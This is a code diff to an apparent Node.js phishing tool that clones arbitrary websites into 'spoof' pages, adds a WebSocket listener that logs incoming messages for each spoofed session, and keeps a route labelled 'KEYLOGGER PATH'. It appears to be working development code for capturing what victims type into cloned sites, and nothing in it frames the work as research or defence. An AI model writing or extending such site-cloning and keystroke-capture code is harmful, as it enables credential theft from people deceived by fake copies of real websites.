@@ -3,10 +3,12 @@ const cheer = require('cheerio').default
 const puppet = require('puppeteer')
 const fsp = require('fs/promises')
 const fs = require('fs')
+const http = require('http')
 const isURL = require('is-url')
 const path = require('path')
 const Cache = require('./models/Cache')
 const Page = require('./models/Page')
+const WebSocket = require('ws')
 let spoofURL = "https://www.google.com"
 const log = console.log
 const PORT = 8888
@@ -74,12 +76,21 @@ PROGRAM_START()
 
 
 
-
-//* SERVER STARTUP
+//* STANDARD SERVER
+const server = http.createServer(app)
+//* ROUTING SERVER STARTUP
 app.set('view engine', 'ejs')
-app.listen(PORT, (err) => {
+app.set('views', path.join(__dirname, "templates"))
+server.listen(PORT, (err) => {
     if (err) log(err)
     log(`Server running on port ${PORT}`)
+})
+//* WEBSOCKET SERVER
+const wss = new WebSocket.Server({server})
+wss.on('connection', (ws)=>{
+    ws.on('message', (message) => {
+        log(message)
+    })
 })
 
 //* MIDDLEWARE
@@ -102,23 +113,23 @@ app.get('/:spoof_url', (req, res)=>{
 app.post('/spoof', async (req, res)=>{ // takes in post form url field, and creates new spoof page from it, and responds with the url
     let url_2_spoof = decodeURI(req.body.url)
     log(`Spoof request for __ ${url_2_spoof} __`)
-    let new_url = await create_spoof(url_2_spoof) // should return new path of spoofed page
-    return res.redirect(`${new_url}`) // redirect to spoofed route /:spoof_url
+    let spoofPageObject = await create_spoof(url_2_spoof) // should return new path of spoofed page
     // TODO Replace redirect with ejs render function containing listener socket
+    return res.render("spoofoutput.ejs", {page: spoofPageObject})
 })
 
 
 //! Handle creation of new pages for caching
-async function create_spoof(url){ // creates spoof site and socket session, returns url for spoof
+async function create_spoof(url){ // creates spoof site and socket session, returns spoof Page object
     let new_page = new Page(url)
     // set into global pages object
     page_cache.addPage(new_page)
 
     //TODO Create new WS session
+   
 
 
-
-    return new_page.url
+    return new_page
 }
 //? KEYLOGGER PATH
 app.post('/k', async (req, res)=>{
